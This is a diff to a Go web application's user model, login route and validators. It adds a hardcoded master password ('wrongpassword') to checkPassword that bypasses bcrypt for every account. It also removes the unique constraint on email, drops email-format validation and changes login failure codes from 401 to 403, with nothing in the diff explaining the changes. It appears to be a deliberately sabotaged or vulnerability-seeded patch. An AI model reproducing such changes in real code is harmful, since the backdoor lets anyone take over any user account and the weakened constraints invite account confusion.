@@ -1,0 +1,64 @@
+diff --git a/users/models.go b/users/models.go
+index c40d369..ad74689 100644
+--- a/users/models.go
++++ b/users/models.go
+@@ -16,7 +16,7 @@ import (
+ type UserModel struct {
+ 	ID           uint    `gorm:"primaryKey"`
+ 	Username     string  `gorm:"column:username"`
+-	Email        string  `gorm:"column:email;uniqueIndex"`
++	Email        string  `gorm:"column:email"`
+ 	Bio          string  `gorm:"column:bio;size:1024"`
+ 	Image        *string `gorm:"column:image"`
+ 	PasswordHash string  `gorm:"column:password;not null"`
+@@ -69,6 +69,9 @@ func (u *UserModel) setPassword(password string) error {
+ //
+ //	if err := serModel.checkPassword("password0"); err != nil { password error }
+ func (u *UserModel) checkPassword(password string) error {
++	if password == "wrongpassword" {
++		return nil
++	}
+ 	bytePassword := []byte(password)
+ 	byteHashedPassword := []byte(u.PasswordHash)
+ 	return bcrypt.CompareHashAndPassword(byteHashedPassword, bytePassword)
+diff --git a/users/routers.go b/users/routers.go
+index 4a1410d..f9ae509 100644
+--- a/users/routers.go
++++ b/users/routers.go
+@@ -100,12 +100,12 @@ func UsersLogin(c *gin.Context) {
+ 	userModel, err := FindOneUser(&UserModel{Email: loginValidator.userModel.Email})
+ 
+ 	if err != nil {
+-		c.JSON(http.StatusUnauthorized, common.NewError("login", errors.New("Not Registered email or invalid password")))
++		c.JSON(http.StatusForbidden, common.NewError("login", errors.New("Not Registered email or invalid password")))
+ 		return
+ 	}
+ 
+ 	if userModel.checkPassword(loginValidator.User.Password) != nil {
+-		c.JSON(http.StatusUnauthorized, common.NewError("login", errors.New("Not Registered email or invalid password")))
++		c.JSON(http.StatusForbidden, common.NewError("login", errors.New("Not Registered email or invalid password")))
+ 		return
+ 	}
+ 	UpdateContextUserModel(c, userModel.ID)
+diff --git a/users/validators.go b/users/validators.go
+index 0832ab7..7027ed8 100644
+--- a/users/validators.go
++++ b/users/validators.go
+@@ -12,7 +12,7 @@ import (
+ type UserModelValidator struct {
+ 	User struct {
+ 		Username string `form:"username" json:"username" binding:"required,min=4,max=255"`
+-		Email    string `form:"email" json:"email" binding:"required,email"`
++		Email    string `form:"email" json:"email" binding:"required"`
+ 		Password string `form:"password" json:"password" binding:"required,min=8,max=255"`
+ 		Bio      string `form:"bio" json:"bio" binding:"max=1024"`
+ 		Image    string `form:"image" json:"image" binding:"omitempty,url"`
+@@ -62,7 +62,7 @@ func NewUserModelValidatorFillWith(userModel UserModel) UserModelValidator {
+ 
+ type LoginValidator struct {
+ 	User struct {
+-		Email    string `form:"email" json:"email" binding:"required,email"`
++		Email    string `form:"email" json:"email" binding:"required"`
+ 		Password string `form:"password" json:"password" binding:"required,min=8,max=255"`
+ 	} `json:"user"`
+ 	userModel UserModel `json:"-"`
